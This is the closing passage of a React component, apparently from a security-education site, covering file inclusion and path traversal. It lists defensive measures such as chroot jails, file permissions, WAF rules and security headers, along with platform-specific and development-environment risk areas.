                <li><strong>Character Filtering:</strong> Remove dangerous characters and sequences</li>
              </ul>
            </div>
            
            <div className="p-4 rounded-md border border-blue-200 dark:border-blue-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-blue-800 dark:text-blue-200">System Security</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>Chroot/Jail:</strong> Isolate applications in restricted environments</li>
                <li><strong>File Permissions:</strong> Implement strict file system permissions</li>
                <li><strong>WAF Rules:</strong> Web application firewall to block attack patterns</li>
                <li><strong>Security Headers:</strong> Implement proper security headers</li>
                <li><strong>Regular Audits:</strong> Periodic security assessments and code reviews</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Special Cases and Advanced Topics */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Special Cases and Advanced Considerations</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Platform-Specific Issues</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Windows:</strong> Case-insensitive paths, 8.3 naming, UNC paths</li>
                <li><strong>PHP:</strong> include() vs require(), PHP wrappers, null byte issues</li>
                <li><strong>Java:</strong> Class loading vulnerabilities, ZIP slip attacks</li>
                <li><strong>Cloud:</strong> Metadata service access, container escapes</li>
                <li><strong>Legacy Systems:</strong> Older validation bypasses and encoding issues</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Development Environment Impact</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Debug Mode:</strong> Additional file access and error disclosure</li>
                <li><strong>Development Tools:</strong> Source maps, debugging endpoints</li>
                <li><strong>Framework Differences:</strong> Varying default security settings</li>
                <li><strong>Container Environments:</strong> Volume mounts and shared filesystems</li>
                <li><strong>CI/CD Pipelines:</strong> Build artifacts and temporary files</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default FileInclusionPathTraversal;
